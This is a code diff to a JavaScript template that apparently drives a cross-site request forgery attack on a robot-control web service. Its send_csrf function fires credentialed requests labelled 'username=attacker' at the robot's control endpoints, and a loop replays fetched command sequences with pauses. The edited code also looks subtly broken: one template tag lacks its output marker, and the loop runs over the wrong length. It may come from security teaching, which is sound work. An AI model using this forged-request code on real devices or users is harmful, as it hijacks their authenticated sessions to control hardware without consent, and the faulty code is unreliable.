@@ -39,14 +39,23 @@ function httpGet(theUrl)
 
 function send_csrf(command){
     // trivial commands
-	var request = new XMLHttpRequest();
-	var params = "username=attacker";
-	request.open('GET', "http://<%= robot_ip %>:3000/control/"+command, true);
-	request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-	request.setRequestHeader("Content-length", params.length);
-	request.withCredentials = true;
-	request.setRequestHeader("Connection", "close");
-	request.send(params);
+	// var request = new XMLHttpRequest();
+	// var params = "username=attacker";
+	// request.open('GET', "http://<%= robot_ip %>:3000/control/"+command, true);
+	// request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+	// request.setRequestHeader("Content-length", params.length);
+	// request.withCredentials = true;
+	// request.setRequestHeader("Connection", "close");
+	// request.send(params);
+
+    var request = new XMLHttpRequest();
+    var params = "username=attacker";
+    request.open('GET', "http://localhost:3000/robotcontrol/<% robot_id %>/"+command, true);
+    request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    request.setRequestHeader("Content-length", params.length);
+    request.withCredentials = true;
+    request.setRequestHeader("Connection", "close");
+    request.send(params);
     // httpGet("/robotcontrol/"+ <%= robot_num %> +"/"+command)
 }
 
@@ -65,26 +74,17 @@ function send_complex_commands(commands){
         return response.json();
     })
     .then((data) => {
-        console.log(data)
-        console.log("data")
+        console.log("data", data["commands"])
+        var command_arr = data["commands"].split(" ")
+
         for (let i = 0; i < data["commands"].length; i++){
-            if (data["commands"].charAt(i) === '1'){
-                send_csrf("left")
+            if (i % 2 == 0) {
+                send_csrf(command_arr[i])
             }
-            else if (data["commands"].charAt(i) === '2'){
-                send_csrf("right")
+            else {
+                sleep(parseInt(command_arr[i]));
             }
-            else if (data["commands"].charAt(i) === '3'){
-                send_csrf("up")
-            }
-            else if (data["commands"].charAt(i) === '4'){
-                send_csrf("down")
-            }
-            else if (data["commands"].charAt(i) === '5'){
-                send_csrf("beep")
-            }
-            sleep(1500);
-            console.log("command send")
+            
         }
     })
     .catch(error => console.log(error));
